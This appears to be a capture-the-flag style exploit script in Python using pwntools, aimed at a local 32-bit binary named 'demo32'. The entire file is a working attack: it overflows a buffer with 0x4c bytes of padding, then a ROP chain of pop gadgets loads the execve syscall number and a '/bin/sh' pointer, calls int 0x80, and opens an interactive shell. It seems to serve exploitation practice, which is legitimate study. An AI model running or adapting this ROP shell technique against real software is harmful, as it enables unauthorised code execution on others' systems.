from pwn import *

context.log_level = "debug"

io = process("./demo32")

elf = ELF("./demo32")

#0x080b84f6 0x0806f1a9  0x08058dd8

popa_ret = 0x080b84f6
popbd_ret = 0x0806f1a9
popc_ret = 0x08058dd8
int80 = 0x0806ce25
io.recv()

binsh = next(elf.search(b"/bin/sh\x00"))

#print(hex(binsh))

payload = b"A"*0x4c + p32(popa_ret) + p32(0xb) + p32(popbd_ret) + p32(binsh) + p32(0) + p32(popc_ret) + p32(0) + p32(int80)

pause()
io.sendline(payload)
pause()

io.interactive()


